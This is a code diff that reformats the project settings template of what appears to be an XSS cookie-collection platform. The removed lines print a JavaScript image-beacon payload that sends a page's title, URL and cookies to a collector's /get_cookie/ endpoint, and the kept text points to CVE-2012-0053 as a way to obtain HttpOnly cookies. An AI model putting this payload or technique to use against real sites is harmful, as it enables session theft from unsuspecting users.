@@ -4,32 +4,32 @@
 {% block body %}
 {% include "_nav_bar.html" %}
 <div class="container">
-    <h3>Project {{ project.title }} settings</h3><hr/>
+    <h3>Project {{ project.title }} settings</h3>
+    <hr/>
     <div class="project_settings">
         <form action="/project/settings/{{ project.id }}/" method="post">
             {% csrf_token %}
             {% if project.keep_session %}
-                <p><input type="checkbox" checked="checked" value="keep_session" name="settings"> Keep session</p>
+            <p><input type="checkbox" checked="checked" value="keep_session" name="settings"> Keep session</p>
             {% else %}
-                <p><input type="checkbox"  value="keep_session" name="settings"> Keep session</p>
+            <p><input type="checkbox" value="keep_session" name="settings"> Keep session</p>
             {% endif %}
             {% if project.custom_js %}
-                <p><input type="checkbox" checked="checked"  value="custom_js" name="settings"> Use custom js</p>
+            <p><input type="checkbox" checked="checked" value="custom_js" name="settings"> Use custom js</p>
             {% else %}
-                <p><input type="checkbox"  name="settings" value="custom_js"> Use custom js</p>
+            <p><input type="checkbox" name="settings" value="custom_js"> Use custom js</p>
             {% endif %}
             <label>Custom js content</label>
             <textarea class="form-control" rows="3" name="custom_js_content">{{ project.custom_js_content }}</textarea><br/>
-            <p>The custom js will replace the origin js, you can click<a href="/xss?id={{ project.id }}" target="_blank"> here </a>to preview.</a>
-            You can construct a url like this</p>
-            <p>
-                <code>var x=new Image();
-                       x.src=''+'http://127.0.0.1:8000/get_cookie/'+'?id=YOUR_PROJECT_ID'+'&title='+document.title+'&url='+escape(document.URL)+'&cookie=COOKIES';
-                </code>
-            </p>
-            <p>For example, you can use <code><a href="http://drops.wooyun.org/papers/501">CVE-2012-0053</a></code> to get cookies with http only flag.</p>
 
-            <p><button type="submit" class="btn btn-primary" onclick="this.form.submit()" >Submit</button></p>
+            <p>The custom js will replace the origin js, you can click
+                <a href="/xss?id={{ project.id }}" target="_blank"> here </a>to preview.</a></p>
+            <p>For example, you can use <code><a href="http://drops.wooyun.org/papers/501">CVE-2012-0053</a></code> to
+                get cookies with http only flag.</p>
+
+            <p>
+                <button type="submit" class="btn btn-primary" onclick="this.form.submit()">Submit</button>
+            </p>
         </form>
 
     </div>
